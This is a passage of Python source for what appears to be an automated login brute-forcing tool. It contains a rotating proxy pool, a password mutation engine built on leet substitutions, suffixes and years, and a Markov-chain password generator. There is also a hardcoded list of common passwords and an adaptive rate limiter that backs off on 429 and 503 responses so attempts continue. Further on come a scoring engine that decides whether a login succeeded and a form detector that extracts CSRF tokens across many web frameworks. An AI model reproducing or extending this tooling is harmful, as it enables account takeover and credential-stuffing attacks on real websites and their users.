        elif s.startswith("socks4://"):
            protocol = ProxyProtocol.SOCKS4
            s = s[9:]
        elif s.startswith("https://"):
            protocol = ProxyProtocol.HTTPS
            s = s[8:]
        elif s.startswith("http://"):
            protocol = ProxyProtocol.HTTP
            s = s[7:]

        # Parse authentication
        if '@' in s:
            auth, rest = s.rsplit('@', 1)
            if ':' in auth:
                username, password = auth.split(':', 1)
            else:
                username = auth
            s = rest

        # Parse address:port
        if ':' in s:
            address, port_str = s.rsplit(':', 1)
            try:
                port = int(port_str)
            except ValueError:
                return None
        else:
            address = s
            port = 80 if protocol in (ProxyProtocol.HTTP, ProxyProtocol.HTTPS) else 1080

        return Proxy(
            address=address,
            port=port,
            protocol=protocol,
            username=username,
            password=password,
        )

    @property
    def count(self) -> int:
        return len(self._alive)

    @property
    def has_proxies(self) -> bool:
        return len(self._alive) > 0

    def get_proxy(self, rotate: bool = True) -> Optional[Proxy]:
        """Get next alive proxy."""
        with self._lock:
            if not self._alive:
                return None
            if rotate:
                self._index = (self._index + 1) % len(self._alive)
            proxy = self._alive[self._index % len(self._alive)]
            proxy.last_used = time.time()
            return proxy

    def get_proxy_dict(self) -> Optional[Dict[str, str]]:
        """Get proxy dict for requests library."""
        proxy = self.get_proxy()
        if proxy:
            return proxy.dict
        return None

    def mark_failed(self, proxy: Proxy):
        """Mark proxy as failed."""
        with self._lock:
            proxy.fail_count += 1
            if proxy.fail_count >= self._max_fails:
                if proxy in self._alive:
                    self._alive.remove(proxy)
                    self._dead.append(proxy)
                    logging.debug(f"{C.yellow('💀 Proxy removed:')} {proxy.url}")

    def mark_alive(self, proxy: Proxy):
        """Reset proxy failure count."""
        with self._lock:
            proxy.fail_count = 0
            if proxy in self._dead:
                self._dead.remove(proxy)
                self._alive.append(proxy)

    def verify_all(self, timeout: int = 5) -> Tuple[int, int]:
        """Verify all proxies. Returns (alive, total)."""
        def check(p):
            try:
                proxies = p.dict
                r = requests.get(self._health_check_url,
                                 proxies=proxies, timeout=timeout)
                p.is_alive = r.status_code == 200
                p.response_time = r.elapsed.total_seconds()
                if p.is_alive:
                    self.mark_alive(p)
                else:
                    self.mark_failed(p)
            except Exception:
                p.is_alive = False
                self.mark_failed(p)

        threads = []
        for proxy in self._proxies:
            t = Thread(target=check, args=(proxy,))
            threads.append(t)
            t.start()
            time.sleep(0.1)  # Throttle

        for t in threads:
            t.join()

        return len(self._alive), len(self._proxies)

    def add_proxy(self, proxy: Proxy):
        """Add a proxy to the pool."""
        with self._lock:
            self._proxies.append(proxy)
            self._alive.append(proxy)

    def remove_proxy(self, proxy: Proxy):
        """Remove a proxy from the pool."""
        with self._lock:
            if proxy in self._alive:
                self._alive.remove(proxy)
            if proxy in self._dead:
                self._dead.remove(proxy)
            if proxy in self._proxies:
                self._proxies.remove(proxy)

    def clear(self):
        """Clear all proxies."""
        with self._lock:
            self._proxies.clear()
            self._alive.clear()
            self._dead.clear()
            self._index = 0


# ═════════════════════════════════════════════════════════════════════════════
# WORDLIST MANAGER
# ═════════════════════════════════════════════════════════════════════════════

class MutationEngine:
    """
    Advanced password mutation engine.
    Generates variants with leet speak, capitalization, suffixes,
    prefixes, and common patterns.
    """

    LEET_MAP = {
        'a': ['@', '4', 'a', 'A'],
        'e': ['3', 'e', 'E'],
        'i': ['1', '!', 'i', 'I'],
        'o': ['0', 'o', 'O'],
        's': ['5', '$', 's', 'S'],
        't': ['7', '+', 't', 'T'],
        'b': ['8', 'b', 'B'],
        'g': ['9', '6', 'g', 'G'],
        'l': ['1', 'l', 'L', '|'],
        'z': ['2', 'z', 'Z'],
    }

    SUFFIXES = [
        '', '123', '1234', '12345', '123456',
        '!', '@', '#', '$', '%', '&',
        '2024', '2025', '2026', '2027',
        '1', '12', '123', '1234',
        '!@#', '!@#$', '?', '!!', '##',
        '0', '00', '000', '01', '007',
        'x', 'xx', 'xxx',
        '.', '..', '...',
        '_', '__', '___', '-', '--',
        'pro', 'best', 'new', 'top',
    ]

    PREFIXES = [
        '', '@', '#', '!', '$', '&',
        'admin', 'Admin', 'ADMIN',
        'new', 'New', 'NEW',
        'my', 'My', 'MY',
        'super', 'Super', 'SUPER',
        '1', '2', '3',
        '!', '@', '#', '$', '%',
    ]

    COMMON_PATTERNS = [
        '{base}{suffix}',
        '{prefix}{base}',
        '{base}{suffix}{base}',
        '{prefix}{base}{suffix}',
        '{base}{base}',
        '{leet}{suffix}',
        '{prefix}{leet}',
        '{capitalize}{suffix}',
        '{upper}{suffix}',
        '{lower}{suffix}',
        '{base}.{suffix}',
        '{base}_{suffix}',
        '{base}-{suffix}',
    ]

    def __init__(self, max_variants: int = 20):
        self.max_variants = max_variants
        self._cache = {}

    def mutate(self, password: str, max_results: int = None) -> List[str]:
        """Generate password mutations."""
        if max_results is None:
            max_results = self.max_variants

        if password in self._cache:
            return list(self._cache[password])

        variants = set()
        variants.add(password)

        # Basic transformations
        if password.isalpha():
            variants.add(password.capitalize())
            variants.add(password.upper())
            variants.add(password.lower())
            if len(password) > 1:
                variants.add(password[0].upper() + password[1:].lower())

        # Leet speak
        leet_variants = self._generate_leet(password)
        variants.update(leet_variants)

        # Suffix combinations
        for base in list(variants)[:10]:
            for suffix in self.SUFFIXES[:10]:
                if suffix:
                    variants.add(f"{base}{suffix}")
                if len(base) > 4:
                    variants.add(f"{base[:3]}{suffix}")
                    variants.add(f"{base[-3:]}{suffix}")

        # Prefix combinations
        for base in list(variants)[:5]:
            for prefix in self.PREFIXES[:5]:
                if prefix:
                    variants.add(f"{prefix}{base}")

        # Duplicate patterns
        for base in list(variants)[:3]:
            variants.add(f"{base}{base}")

        # Common patterns with leet base
        for leet in leet_variants[:3]:
            for suffix in self.SUFFIXES[:5]:
                variants.add(f"{leet}{suffix}")

        # Year combinations
        years = ['2024', '2025', '2026', '2023', '2022']
        for base in list(variants)[:3]:
            for year in years:
                variants.add(f"{base}{year}")
                variants.add(f"{year}{base}")
                variants.add(f"{base}_{year}")
                variants.add(f"{base}.{year}")

        # Remove original if too many
        result = list(variants)
        if len(result) > max_results:
            # Keep original first, then random sample
            result = [password] + random.sample([v for v in result if v != password], 
                                                  min(max_results - 1, len(result) - 1))

        self._cache[password] = result
        return result

    def _generate_leet(self, password: str) -> Set[str]:
        """Generate leet speak variants."""
        variants = set()
        password_lower = password.lower()

        # Find leet-able positions
        positions = []
        for i, ch in enumerate(password_lower):
            if ch in self.LEET_MAP:
                positions.append((i, ch))

        if not positions:
            return variants

        # Generate up to 8 random leet variants
        for _ in range(min(8, 2 ** len(positions))):
            variant = list(password)
            for i, ch in positions:
                replacement = random.choice(self.LEET_MAP[ch])
                variant[i] = replacement
            variants.add(''.join(variant))

        # Full leet (all possible substitutions)
        full_leet = list(password)
        for i, ch in positions:
            full_leet[i] = self.LEET_MAP[ch][0]
        variants.add(''.join(full_leet))

        return variants


class MarkovGenerator:
    """
    Markov chain-based password generator.
    Learns character patterns from existing wordlist and generates
    realistic new passwords.
    """

    def __init__(self, order: int = 2):
        self.order = order
        self.chain = defaultdict(Counter)
        self.start_chars = Counter()
        self.min_length = 4
        self.max_length = 16

    def train(self, passwords: List[str]):
        """Train the Markov chain on a list of passwords."""
        for pwd in passwords:
            pwd = pwd.strip().lower()
            if len(pwd) < self.min_length:
                continue

            # Start character n-gram
            if len(pwd) >= self.order:
                self.start_chars[pwd[:self.order]] += 1

            # Build transition matrix
            padded = pwd + '\n'
            for i in range(len(padded) - self.order):
                gram = padded[i:i + self.order]
                next_char = padded[i + self.order]
                self.chain[gram][next_char] += 1

    def generate(self, count: int = 50) -> List[str]:
        """Generate passwords using the trained chain."""
        passwords = set()
        attempts = 0

        while len(passwords) < count and attempts < count * 10:
            attempts += 1

            # Choose random start
            if not self.start_chars:
                break
            start = random.choices(
                list(self.start_chars.keys()),
                weights=list(self.start_chars.values()),
            )[0]

            # Generate
            password = start
            for _ in range(self.max_length):
                gram = password[-self.order:]
                if gram not in self.chain or not self.chain[gram]:
                    break
                chars, weights = zip(*self.chain[gram].items())
                next_char = random.choices(chars, weights=weights)[0]
                if next_char == '\n':
                    break
                password += next_char

            if len(password) >= self.min_length and len(password) <= self.max_length:
                # Randomly capitalize or add suffix
                variant = password
                if random.random() > 0.5:
                    variant = password.capitalize()
                if random.random() > 0.7:
                    variant += random.choice(['123', '!', '@', '2024', '2025'])
                passwords.add(variant)

        return list(passwords)


class WordlistManager:
    """
    Handles wordlist loading, processing, mutation, and Markov generation.
    Supports multiple file formats and encoding detection.
    """

    ENCODINGS = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1', 'ascii']

    def __init__(self, min_length: int = 1, max_length: int = 64,
                 deduplicate: bool = True, shuffle: bool = False):
        self.min_length = min_length
        self.max_length = max_length
        self.deduplicate = deduplicate
        self.shuffle = shuffle
        self._words: List[str] = []
        self._word_set: Set[str] = set()

    @property
    def words(self) -> List[str]:
        return list(self._words)

    @property
    def count(self) -> int:
        return len(self._words)

    def load_file(self, filepath: str) -> int:
        """Load words from a file. Returns count loaded."""
        if not os.path.exists(filepath):
            raise WordlistError(f"File not found: {filepath}")

        count = 0
        for encoding in self.ENCODINGS:
            try:
                with open(filepath, 'r', encoding=encoding, errors='replace') as f:
                    for line in f:
                        word = line.strip()
                        if not word or word.startswith('#'):
                            continue
                        if self.min_length <= len(word) <= self.max_length:
                            if self.deduplicate:
                                if word not in self._word_set:
                                    self._word_set.add(word)
                                    self._words.append(word)
                                    count += 1
                            else:
                                self._words.append(word)
                                count += 1
                break  # Success
            except (UnicodeDecodeError, UnicodeError):
                continue

        if count == 0:
            raise WordlistError(f"Could not decode file: {filepath}")

        if self.shuffle:
            random.shuffle(self._words)

        return count

    def load_list(self, words: List[str]) -> int:
        """Load words from a list."""
        count = 0
        for word in words:
            word = word.strip()
            if not word:
                continue
            if self.min_length <= len(word) <= self.max_length:
                if self.deduplicate:
                    if word not in self._word_set:
                        self._word_set.add(word)
                        self._words.append(word)
                        count += 1
                else:
                    self._words.append(word)
                    count += 1
        return count

    def apply_mutation(self, mutation_engine: MutationEngine,
                       max_variants: int = 5) -> int:
        """Apply mutation to all words. Returns number of new words."""
        new_words = set()
        for word in self._words:
            variants = mutation_engine.mutate(word, max_results=max_variants)
            for variant in variants:
                if variant not in self._word_set:
                    new_words.add(variant)

        self._words.extend(new_words)
        self._word_set.update(new_words)
        return len(new_words)

    def generate_markov(self, markov: MarkovGenerator, count: int = 50) -> int:
        """Generate Markov passwords. Returns number generated."""
        generated = markov.generate(count)
        new_words = [w for w in generated if w not in self._word_set]
        self._words.extend(new_words)
        self._word_set.update(new_words)
        return len(new_words)

    def filter_by_pattern(self, pattern: str) -> int:
        """Keep only words matching regex pattern. Returns new count."""
        try:
            regex = re.compile(pattern)
            self._words = [w for w in self._words if regex.search(w)]
            self._word_set = set(self._words)
        except re.error:
            pass
        return len(self._words)

    def filter_by_length(self, min_l: int = None, max_l: int = None) -> int:
        """Filter words by length."""
        if min_l is None:
            min_l = self.min_length
        if max_l is None:
            max_l = self.max_length
        self._words = [w for w in self._words if min_l <= len(w) <= max_l]
        self._word_set = set(self._words)
        return len(self._words)

    def common_passwords(self, count: int = 100) -> List[str]:
        """Return most common password patterns."""
        common = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'sunshine',
            'qwerty123', '0', 'admin', 'letmein', 'monkey',
            'dragon', 'abc123', 'trustno1', 'master', '123123',
            'welcome', 'login', 'princess', 'football', 'shadow',
            'passw0rd', 'iloveyou', 'starwars', 'ninja', 'qazwsx',
            'password1', 'password123', 'admin123', 'adminadmin',
            'welcome1', 'welcome123', 'changeme', 'changethis',
            'default', 'temp123', 'temporary', 'guest', 'user',
            'root', 'toor', 'demo', 'test', 'test123',
            'P@ssw0rd', 'Passw0rd', 'P@$$w0rd', 'p@ssw0rd',
            'admin@123', 'Admin@123', 'Admin123',
            '000000', '00000000', '0123456789',
            '1q2w3e4r', '1q2w3e4r5t', 'qwertyuiop',
            'asdfghjkl', 'zxcvbnm', '!@#$%^&*',
            'pass123', 'pass1234', 'pass12345',
            'temp_pass', 'temp1234', 'temporary123',
            'changeme123', 'ChangeMe', 'CHANGEME',
            'admin2024', 'admin2025', 'admin2026',
            'password2024', 'password2025',
            'test@123', 'Test123', 'Test@123',
            'server', 'server123', 'Server123',
            'backup', 'backup123', 'Backup123',
            'support', 'Support123', 'support@123',
            'info', 'info123', 'Info@123',
            'webmaster', 'web123', 'webadmin',
            'manager', 'Manager1', 'manager123',
            'secure', 'Secure1', 'Secure123',
            'Pa$$w0rd', 'P@$$word', 'p@$$w0rd!',
            'S3cur3', 's3cur3', 'S3cur1ty',
            'C0mpl3x', 'c0mpl3x', 'Str0ng!',
        ]
        return common[:count]

    def save(self, filepath: str):
        """Save wordlist to file."""
        with open(filepath, 'w', encoding='utf-8') as f:
            for word in self._words:
                f.write(word + '\n')

    def stats(self) -> Dict[str, Any]:
        """Get wordlist statistics."""
        if not self._words:
            return {"count": 0, "avg_length": 0, "unique_chars": 0}

        lengths = [len(w) for w in self._words]
        chars = set(''.join(self._words))

        return {
            "count": len(self._words),
            "min_length": min(lengths),
            "max_length": max(lengths),
            "avg_length": sum(lengths) / len(lengths),
            "unique_chars": len(chars),
            "unique_words": len(self._word_set),
        }


# ═════════════════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═════════════════════════════════════════════════════════════════════════════

class TokenBucket:
    """Token bucket rate limiter."""

    def __init__(self, rate: float, burst: int = 1):
        self.rate = rate
        self.burst = burst
        self.tokens = float(burst)
        self.last_refill = time.monotonic()
        self.lock = Lock()

    def acquire(self, tokens: int = 1, block: bool = True) -> bool:
        """Acquire tokens from the bucket."""
        with self.lock:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
            self.last_refill = now

            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            elif block:
                deficit = tokens - self.tokens
                wait_time = deficit / self.rate if self.rate > 0 else 0.1
                time.sleep(wait_time)
                self.tokens = 0
                self.last_refill = time.monotonic()
                return True
            return False


class AdaptiveRateLimiter:
    """
    Adaptive rate limiter that adjusts based on server response.
    Detects 429, 503 and slows down automatically.
    """

    def __init__(self, base_delay: float = 1.0, min_delay: float = 0.1,
                 max_delay: float = 30.0, backoff_factor: float = 2.0,
                 recovery_factor: float = 0.5):
        self.base_delay = base_delay
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.backoff_factor = backoff_factor
        self.recovery_factor = recovery_factor
        self.current_delay = base_delay
        self.consecutive_ok = 0
        self.consecutive_fail = 0
        self.lock = Lock()
        self.last_request = 0.0
        self._rate_limited_until = 0.0

    def wait(self):
        """Wait appropriate delay before next request."""
        with self.lock:
            now = time.time()

            # Check if we're in a rate-limited penalty period
            if now < self._rate_limited_until:
                wait_time = self._rate_limited_until - now + random.uniform(0.5, 2.0)
                time.sleep(wait_time)
                return

            # Normal delay with jitter
            delay = self.current_delay * random.uniform(0.8, 1.2)

            # Ensure minimum spacing
            elapsed = now - self.last_request
            if elapsed < delay:
                time.sleep(delay - elapsed)

            self.last_request = time.time()

    def report_ok(self):
        """Report successful request."""
        with self.lock:
            self.consecutive_ok += 1
            self.consecutive_fail = 0
            if self.consecutive_ok >= 5 and self.current_delay > self.min_delay:
                self.current_delay = max(
                    self.min_delay,
                    self.current_delay * self.recovery_factor
                )
                self.consecutive_ok = 0

    def report_fail(self, status_code: int = None):
        """Report failed request (rate limited, error, etc.)."""
        with self.lock:
            self.consecutive_fail += 1
            self.consecutive_ok = 0
            self.current_delay = min(
                self.max_delay,
                self.current_delay * self.backoff_factor *
                (1 + random.uniform(0, 0.5))
            )

            if status_code == 429:
                # Rate limited - apply penalty period
                penalty = min(60, 5 * self.backoff_factor ** self.consecutive_fail)
                self._rate_limited_until = time.time() + penalty
                logging.warning(
                    f"{C.yellow('⚠ 429 Rate Limited!')} "
                    f"{C.dim(f'Penalty: {penalty:.0f}s')}"
                )
            elif status_code == 503:
                penalty = min(30, 3 * self.backoff_factor ** self.consecutive_fail)
                self._rate_limited_until = time.time() + penalty
                logging.warning(
                    f"{C.yellow('⚠ 503 Service Unavailable!')} "
                    f"{C.dim(f'Penalty: {penalty:.0f}s')}"
                )

    def reset(self):
        """Reset rate limiter to base state."""
        with self.lock:
            self.current_delay = self.base_delay
            self.consecutive_ok = 0
            self.consecutive_fail = 0
            self._rate_limited_until = 0.0

    @property
    def stats(self) -> Dict:
        return {
            "current_delay": self.current_delay,
            "min_delay": self.min_delay,
            "max_delay": self.max_delay,
            "consecutive_ok": self.consecutive_ok,
            "consecutive_fail": self.consecutive_fail,
        }


# ═════════════════════════════════════════════════════════════════════════════
# SUCCESS DETECTION ENGINE
# ═════════════════════════════════════════════════════════════════════════════

class DetectionEngine:
    """
    Multi-layered success/failure detection system.
    Uses keyword scoring, response analysis, redirect tracking,
    content comparison, and heuristics.
    """

    # Success indicators (weighted by reliability)
    SUCCESS_PATTERNS = [
        (10, r'dashboard|admin\s*dashboard|control\s*panel|admin\s*panel'),
        (9, r'logout|sign\s*out|log\s*out'),
        (8, r'welcome\s*(back|,|admin|user)'),
        (8, r'my\s*profile|account\s*settings|edit\s*profile'),
        (7, r'user\s*management|user\s*list|user\s*administration'),
        (7, r'system\s*settings|global\s*settings|configuration'),
        (6, r'analytics|reports?|statistics|dashboard'),
        (6, r'moderator|mod\s*panel|super\s*admin|admin\s*area'),
        (5, r'server\s*status|cpu\s*usage|ram\s*usage|system\s*info'),
        (5, r'notifications|activity\s*logs|audit\s*trail'),
        (5, r'content\s*management|post\s*manager|media\s*library'),
        (4, r'premium|subscription|billing|invoice|payment'),
        (4, r'api\s*keys|secret\s*key|api\s*settings'),
        (4, r'role\s*management|permissions|user\s*roles'),
        (3, r'file\s*manager|upload|media\s*manager'),
        (3, r'security\s*logs|access\s*logs|error\s*logs'),
        (3, r'support\s*tickets|disputes|contact\s*inquiries'),
        (2, r'two-factor|2fa|two\s*factor\s*auth'),
        (2, r'sessions?|active\s*sessions|force\s*logout'),
        (1, r'profile|settings|preferences|account'),
    ]

    # Failure indicators (weighted by reliability)
    FAILURE_PATTERNS = [
        (10, r'invalid\s+(username|password|email|credentials|login)'),
        (9, r'incorrect\s+(password|username|credentials)'),
        (8, r'login\s+failed|authentication\s+failed'),
        (8, r'wrong\s+(password|credentials|username)'),
        (7, r'bad\s+credentials|invalid\s+credentials'),
        (7, r'user\s+not\s+found|account\s+not\s+found'),
        (6, r'access\s+denied|unauthorized'),
        (6, r'please\s+try\s+again|try\s+again'),
        (5, r'too\s+many\s+attempts|account\s+(locked|blocked|suspended)'),
        (5, r'forgot\s+password|reset\s+password'),
        (4, r'captcha|recaptcha|hcaptcha|turnstile|verify\s+captcha'),
        (4, r'otp\s+required|verification\s+code|2fa\s+required'),
        (3, r'session\s+expired|please\s+login|please\s+log\s+in'),
        (2, r'error\s+occurred|something\s+went\s+wrong'),
        (1, r'invalid|error|failed|denied'),
    ]

    def __init__(self):
        self._success_re = [
            (score, re.compile(pat, re.I))
            for score, pat in self.SUCCESS_PATTERNS
        ]
        self._failure_re = [
            (score, re.compile(pat, re.I))
            for score, pat in self.FAILURE_PATTERNS
        ]
        self._cookie_jars = {}

    def analyze(self, response: requests.Response, 
                login_page_content: Optional[str] = None) -> Tuple[bool, float, List[str]]:
        """
        Analyze response for login success/failure.
        Returns: (is_success, confidence_score, matched_keywords)
        """
        text = response.text
        url = response.url.lower()
        matched_keywords = []
        success_score = 0.0
        failure_score = 0.0

        # ── 1. Check for redirects (strongest signal) ──
        if response.history:
            for hist in response.history:
                loc = hist.headers.get('Location', '').lower()
                if loc and 'login' not in loc and 'signin' not in loc:
                    success_score += 30
                    matched_keywords.append(f"redirect: {loc[:50]}")
                    break
                elif loc and ('login' in loc or 'signin' in loc):
                    failure_score += 20
                    matched_keywords.append("redirect_to_login")

            if response.history:
                # Final URL isn't the login page
                if 'login' not in url and 'signin' not in url and 'auth' not in url:
                    success_score += 10
                elif 'login' in url or 'signin' in url:
                    failure_score += 5

        # ── 2. URL pattern analysis ──
        if not any(x in url for x in ['login', 'signin', 'auth']):
            success_score += 5

        # ── 3. Success keyword matching ──
        for score, pattern in self._success_re:
            match = pattern.search(text)
            if match:
                success_score += score
                matched_keywords.append(match.group(0)[:30])

        # ── 4. Failure keyword matching ──
        for score, pattern in self._failure_re:
            match = pattern.search(text)
            if match:
                failure_score += score
                matched_keywords.append(f"FAIL: {match.group(0)[:30]}")

        # ── 5. Content length comparison ──
        if login_page_content:
            login_len = len(login_page_content)
            resp_len = len(response.content)
            ratio = resp_len / max(login_len, 1)

            if ratio > 1.5:  # Significantly larger = likely dashboard
                success_score += 10
            elif ratio < 0.5:  # Much smaller = likely error
                failure_score += 5

        # ── 6. Cookie / session analysis ──
        cookies = dict(response.cookies)
        if any('session' in k.lower() or 'token' in k.lower() 
               for k in cookies):
            success_score += 5

        # ── 7. Content-type analysis ──
        ct = response.headers.get('Content-Type', '').lower()
        if 'application/json' in ct:
            # JSON API response - check for success field
            try:
                data = response.json()
                if data.get('success') or data.get('status') in ('ok', 'success'):
                    success_score += 20
                    matched_keywords.append("json_success")
                elif data.get('error') or data.get('message', '').lower() in FAIL:
                    failure_score += 15
            except (json.JSONDecodeError, ValueError):
                pass

        # ── 8. Status code analysis ──
        if response.status_code in (200, 201):
            pass  # Neutral - could be either
        elif response.status_code in (302, 307, 308):
            success_score += 15  # Redirect after login
        elif response.status_code == 401:
            failure_score += 20
        elif response.status_code == 403:
            failure_score += 15
        elif response.status_code == 429:
            failure_score += 25
            matched_keywords.append("RATE_LIMITED")

        # ── Final decision ──
        is_success = success_score > failure_score and success_score >= 15

        # Clear matched keywords if not success
        if not is_success:
            matched_keywords = [k for k in matched_keywords if k.startswith("FAIL:")]

        confidence = success_score / max(success_score + failure_score, 1)

        return is_success, confidence, matched_keywords[:10]


# ═════════════════════════════════════════════════════════════════════════════
# FORM DETECTION ENGINE — UNIVERSAL
# ═════════════════════════════════════════════════════════════════════════════

class FrameworkType(Enum):
    UNKNOWN = "unknown"
    WORDPRESS = "wordpress"
    JOOMLA = "joomla"
    DRUPAL = "drupal"
    MAGENTO = "magento"
    LARAVEL = "laravel"
    SYMFONY = "symfony"
    DJANGO = "django"
    FLASK = "flask"
    SPRING = "spring"
    ASPNET = "aspnet"
    RAILS = "rails"
    PHPCMS = "phpcms"
    CUSTOM = "custom"
    JSON_API = "json_api"
    BASIC_AUTH = "basic_auth"
    DIGEST_AUTH = "digest_auth"
    NTLM_AUTH = "ntlm_auth"


@dataclass
class DetectedForm:
    """Universal login form representation."""
    action: str
    method: str = "POST"
    user_field: str = "email"
    pass_field: str = "password"
    csrf_field: Optional[str] = None
    csrf_token: Optional[str] = None
    csrf_meta: Optional[str] = None
    csrf_header: Optional[str] = None
    hidden: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    json_fields: Optional[Dict[str, str]] = None
    framework: FrameworkType = FrameworkType.UNKNOWN
    auth_type: str = "form"
    extra_data: Dict[str, Any] = field(default_factory=dict)
    is_ajax: bool = False
    content_type: str = "application/x-www-form-urlencoded"
    submit_trigger: Optional[str] = None
    onsubmit: Optional[str] = None
    confidence: float = 0.0

    def to_payload(self, user: str, password: str) -> Dict:
        """Build payload dict from form data."""
        payload = dict(self.hidden)
        if self.json_fields:
            payload.update(self.json_fields)
        payload[self.user_field] = user
        payload[self.pass_field] = password
        if self.csrf_field and self.csrf_token:
            payload[self.csrf_field] = self.csrf_token
        if self.submit_trigger:
            payload[self.submit_trigger] = "submit"
        return payload

    def to_json_payload(self, user: str, password: str) -> Dict:
        """Build JSON payload."""
        payload = {}
        if self.json_fields:
            payload.update(self.json_fields)
        payload[self.user_field] = user
        payload[self.pass_field] = password
        if self.csrf_field and self.csrf_token:
            payload[self.csrf_field] = self.csrf_token
        return payload


class UniversalFormDetector:
    """
    Detects login forms from ANY framework.
    Supports: HTML forms, JSON APIs, Basic/Digest/NTLM auth,
    SPAs (React/Angular/Vue), mobile APIs, WebSocket auth.
    """

    # Framework signatures
    FRAMEWORK_SIGNATURES = {
        FrameworkType.WORDPRESS: [
            (r'/wp-(login|admin)', 10),
            (r'wp-content|wp-includes', 8),
            (r'wordpress', 5),
            (r'wp-login\.php', 10),
        ],
        FrameworkType.JOOMLA: [
            (r'joomla|com_users', 10),
            (r'option=com_users', 10),
            (r'/administrator', 8),
            (r'mod_login', 8),
        ],
        FrameworkType.DRUPAL: [
            (r'drupal|drupal\.js', 10),
            (r'form\-[a-z0-9\-]+', 5),
            (r'/user/login', 8),
            (r'form_build_id', 8),
        ],
        FrameworkType.MAGENTO: [
            (r'magento|mage\b', 10),
            (r'form_key', 8),
            (r'/customer/account/login', 8),
            (r'mage/cookies', 5),
        ],
        FrameworkType.LARAVEL: [
            (r'laravel|_token|csrf-token', 10),
            (r'__token', 8),
            (r'XSRF-TOKEN', 8),
        ],
        FrameworkType.DJANGO: [
            (r'django|csrfmiddlewaretoken', 10),
            (r'csrftoken', 8),
            (r'sessionid', 5),
        ],
        FrameworkType.SPRING: [
            (r'_csrf|spring|XSRF-TOKEN', 10),
            (r'JSESSIONID', 5),
        ],
        FrameworkType.ASPNET: [
            (r'__requestverificationtoken|__VIEWSTATE', 10),
            (r'ASP\.NET_SessionId|\.ASPXAUTH', 8),
            (r'__EVENTVALIDATION', 8),
        ],
        FrameworkType.RAILS: [
            (r'authenticity_token|rails|Rails', 10),
            (r'_session_id', 5),
        ],
        FrameworkType.SYMFONY: [
            (r'symfony|_csrf_token', 8),
        ],
        FrameworkType.FLASK: [
            (r'flask|session', 5),
        ],
    }

    # CSRF token field patterns
    CSRF_PATTERNS = re.compile(
        r'(csrf|_token|_csrf|csrf_token|csrfmiddlewaretoken|'
        r'authenticity_token|__requestverificationtoken|'
        r'form_key|_csrf_token|xsrf|xsrf-token|'
        r'requestverificationtoken|__csrf|nonce|'
        r'anti[_-]?forgery[_-]?token|security[_-]?token)',
        re.I,
    )

    # CSRF meta tag patterns
    CSRF_META_PATTERNS = re.compile(
        r'(csrf-token|csrf-param|_csrf|csrf)',
        re.I,
    )

    # Password field patterns
    PASS_PATTERNS = re.compile(
        r'(password|passwd|pwd|pass|secret|passphrase|pin|'
        r'passe|senha|contraseña|parola|motdepasse|'
        r'lösenord|heslo|geslo|пароль|密码|密码)',
        re.I,
    )

    # Username/email field patterns
    USER_PATTERNS = re.compile(
        r'(username|user|email|login|user_id|uid|name|'
        r'account|phone|mobile|tel|identifier|identity|'
        r'logon|usuario|utilisateur|benutzername|'
        r'nomeutente|пользователь|用户名)',
        re.I,
    )

    # JSON API auth patterns
    JSON_AUTH_PATTERNS = [
        r'"password"\s*:',
        r'"email"\s*:.*"password"\s*:',
        r'"username"\s*:.*"password"\s*:',
        r'"token"\s*:.*"password"\s*:',
        r'/api/(auth|login|signin|token)',
        r'"grant_type"',
        r'"client_id".*"client_secret"',
        r'/oauth/(token|authorize)',
    ]

    # Basic/Digest auth detection
    AUTH_HEADER_PATTERNS = re.compile(
        r'WWW-Authenticate:\s*(Basic|Digest|NTLM|Bearer)',
        re.I,
    )

    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self._detected_forms: List[DetectedForm] = []

    def detect_from_url(self, url: str, 
                        html_content: Optional[str] = None,
                        response: Optional[requests.Response] = None,
                        deep_scan: bool = True) -> Optional[DetectedForm]:
        """
        Detect login form from a URL.
        Returns the best matching DetectedForm or None.
        """
        if response is None:
            try:
                response = self.session.get(url, timeout=15)
            except Exception as e:
                logging.error(f"{C.red('✗ Connection failed:')} {e}")
                return None

        if html_content is None:
            html_content = response.text

        # Detect framework
        framework = self._detect_framework(html_content, response.headers, url)
        logging.debug(f"{C.dim(f'Detected framework: {framework.value}')}")

        # Store all forms
        all_forms: List[DetectedForm] = []

        # ── 1. Check for Basic/Digest/NTLM auth ──
        auth_form = self._check_http_auth(response)
        if auth_form:
            all_forms.append(auth_form)

        # ── 2. Check for JSON API auth ──
        json_form = self._detect_json_api(response, url)
        if json_form:
            all_forms.append(json_form)

        # ── 3. Parse HTML forms ──
        if HAVE_BS4:
            html_forms = self._parse_html_forms(html_content, url, framework)
            all_forms.extend(html_forms)

        # ── 4. Check for SPA-style auth (meta/config based) ──
        spa_form = self._detect_spa_auth(html_content, url, framework)
        if spa_form:
            all_forms.append(spa_form)

        # ── 5. Score and select best form ──
        if not all_forms:
            logging.warning(f"{C.yellow('⚠ No login form detected!')}")
            return None

        for form in all_forms:
            form.confidence = self._score_form(form, html_content, response)

        best = max(all_forms, key=lambda f: f.confidence)
        self._detected_forms.append(best)

        logging.info(
            f"{C.green('✓ Form detected:')} "
            f"{C.cyan(best.framework.value)} / {C.cyan(best.auth_type)} "
            f"{C.dim(f'(confidence: {best.confidence:.0%})')}"
        )

        return best

    def _detect_framework(self, html: str, headers: Dict, url: str) -> FrameworkType:
        """Detect the web framework."""
        combined = html + ' ' + str(headers) + ' ' + url

        # Check each framework signature
        best_framework = FrameworkType.UNKNOWN
        best_score = 0

        for framework, patterns in self.FRAMEWORK_SIGNATURES.items():
            score = 0
            for pattern, weight in patterns:
                if re.search(pattern, combined, re.I):
                    score += weight
            if score > best_score:
                best_score = score
                best_framework = framework

        # Check for JSON API based on URL patterns
        if any(re.search(p, url, re.I) for p in ['/api/', '/rest/', '/v1/', '/v2/']):
            if best_score < 5:
                return FrameworkType.JSON_API

        return best_framework

    def _check_http_auth(self, response: requests.Response) -> Optional[DetectedForm]:
        """Check for HTTP Basic/Digest/NTLM authentication."""
        auth_header = response.headers.get('WWW-Authenticate', '')
        if not auth_header:
            return None

